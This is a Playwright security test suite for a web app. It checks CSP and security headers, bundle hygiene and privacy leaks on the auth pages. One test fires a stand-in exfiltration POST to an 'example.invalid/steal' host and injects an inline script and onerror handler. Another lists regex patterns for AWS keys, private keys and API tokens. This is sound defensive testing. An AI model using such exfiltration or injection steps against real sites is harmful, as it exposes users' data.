import { expect, test } from '@playwright/test'
import { demo, watch } from './helpers'

test.describe('headers and Content-Security-Policy', () => {
  test('the server sends the full header set', async ({ page }) => {
    const res = await page.goto('/'); const h = res!.headers()
    const csp = h['content-security-policy']
    for (const d of ["default-src 'self'", "script-src 'self'", "object-src 'none'", "base-uri 'self'", "form-action 'self'", "frame-ancestors 'none'", "img-src 'self' data:", "connect-src 'self'"]) expect(csp).toContain(d)
    expect(csp).not.toMatch(/unsafe-inline|unsafe-eval|\*/)
    expect(h['x-content-type-options']).toBe('nosniff'); expect(h['x-frame-options']).toBe('DENY'); expect(h['referrer-policy']).toBe('strict-origin-when-cross-origin')
    expect(h['permissions-policy']).toContain('camera=()'); expect(h['strict-transport-security']).toContain('max-age='); expect(h['cross-origin-opener-policy']).toBe('same-origin')
  })
  test('the HTML also carries a CSP meta tag and no inline script', async ({ page }) => {
    await page.goto('/')
    expect(await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content')).toContain("script-src 'self'")
    expect(await page.locator('script:not([src])').count()).toBe(0)
    expect(await page.locator('[style*="javascript"], [onclick], [onerror], [onload]').count()).toBe(0)
  })
  test('a tour of every route raises no CSP violation, no page error and no console error', async ({ page }) => {
    const w = await watch(page); const consoleErrors: string[] = []; page.on('console', (m) => { if (m.type() === 'error' || m.type() === 'warning') consoleErrors.push(m.text()) })
    for (const p of ['/', '/sign-in', '/sign-up', '/reset', '/foundations']) { await page.goto(p); await page.waitForTimeout(150) }
    await demo(page)
    for (const p of ['/app/home', '/app/review', '/app/inbox', '/app/follow-ups', '/app/calendar', '/app/agent', '/app/pipeline', '/app/pipeline/d3', '/app/contacts', '/app/contacts/p1', '/app/companies', '/app/companies/c1', '/app/templates', '/app/reports',
      ...['profile', 'security', 'workspace', 'team', 'mailboxes', 'automation', 'facts', 'notifications', 'integrations', 'audit'].map((t) => '/app/settings/' + t), '/onboarding/1', '/onboarding/3', '/onboarding/5']) {
      await page.goto(p); await page.waitForTimeout(120)
    }
    expect(await w.cspViolations()).toEqual([]); expect(w.seen.errors).toEqual([]); expect(consoleErrors).toEqual([])
  })
  test('the policy blocks an injected inline script and an injected inline handler (eval is off: no unsafe-eval in the header)', async ({ page }) => {
    const w = await watch(page); await page.goto('/sign-in')
    const result = await page.evaluate(() => {
      const w2 = window as unknown as { __x?: number }
      const s = document.createElement('script'); s.textContent = 'window.__x = 1'; document.head.appendChild(s)
      const i = document.createElement('img'); i.setAttribute('onerror', 'window.__x = 2'); i.src = 'x'; document.body.appendChild(i)
      return { x: w2.__x }
    })
    await page.waitForTimeout(300)
    expect(result.x).toBeUndefined(); expect((await w.cspViolations()).length).toBeGreaterThan(0)
  })
  test('the page cannot be fetched into or send data to another origin', async ({ page }) => {
    await page.goto('/sign-in')
    const out = await page.evaluate(async () => { try { await fetch('https://example.invalid/steal', { method: 'POST', body: 'x' }); return 'sent' } catch { return 'blocked' } })
    expect(out).toBe('blocked')
  })
})

test.describe('the build', () => {
  test('no source maps are shipped or referenced', async ({ page, request }) => {
    await page.goto('/'); const src = await page.locator('script[src]').first().getAttribute('src')
    expect(src).toBeTruthy()
    const js = await (await request.get(src!)).text()
    expect(js).not.toMatch(/sourceMappingURL/)
    const map = await request.get(src! + '.map'); const text = await map.text()
    expect(map.status() === 404 || !text.trimStart().startsWith('{"version"')).toBe(true)
  })
  test('the bundle holds no secrets, keys, tokens or private URLs', async ({ page, request }) => {
    await page.goto('/'); const src = await page.locator('script[src]').first().getAttribute('src'); const js = await (await request.get(src!)).text()
    for (const re of [/AKIA[0-9A-Z]{16}/, /-----BEGIN [A-Z ]*PRIVATE KEY-----/, /sk_(live|test)_[0-9A-Za-z]{10,}/, /ghp_[0-9A-Za-z]{20,}/, /xox[bap]-[0-9A-Za-z-]{10,}/, /eyJ[A-Za-z0-9_-]{15,}\.[A-Za-z0-9_-]{15,}\./, /(api[_-]?key|secret|client[_-]?secret|password)\s*[:=]\s*["'][^"']{8,}["']/i]) expect(js, String(re)).not.toMatch(re)
    expect(js).not.toMatch(/localhost:\d{4}/)
  })
  test('the bundle has no console logging of data', async ({ page, request }) => {
    await page.goto('/'); const src = await page.locator('script[src]').first().getAttribute('src'); const js = await (await request.get(src!)).text()
    expect(js).not.toMatch(/console\.log\(/)
  })
})

test.describe('privacy', () => {
  test('nothing typed on the auth pages reaches the console, the URL or storage', async ({ page }) => {
    const logs: string[] = []; page.on('console', (m) => logs.push(m.text())); page.on('pageerror', (e) => logs.push(e.message))
    const SECRET = 'Zebra-Moon-77-secret'; const MAIL = 'private.person@razatraders.com'
    await page.goto('/sign-in'); await page.locator('input[type=email]').fill(MAIL); await page.locator('input[type=password]').fill('x'); await page.locator('button[type=submit]').click(); await page.waitForTimeout(600)
    await page.goto('/sign-up'); const f = page.locator('form input'); await f.nth(0).fill('Private Person'); await f.nth(1).fill('Raza Traders'); await f.nth(2).fill(MAIL); await f.nth(3).fill(SECRET); await page.locator('button[type=submit]').click(); await page.waitForURL('**/verify')
    const dump = await page.evaluate(() => JSON.stringify({ l: { ...localStorage }, s: { ...sessionStorage }, h: history.state }))
    for (const leak of [SECRET, MAIL, 'Private Person']) { expect(logs.join('\n')).not.toContain(leak); expect(page.url()).not.toContain(leak.toLowerCase()); expect(dump.replace(/"usr":\{"email":"[^"]+"\}/, '')).not.toContain(leak) }
  })
})
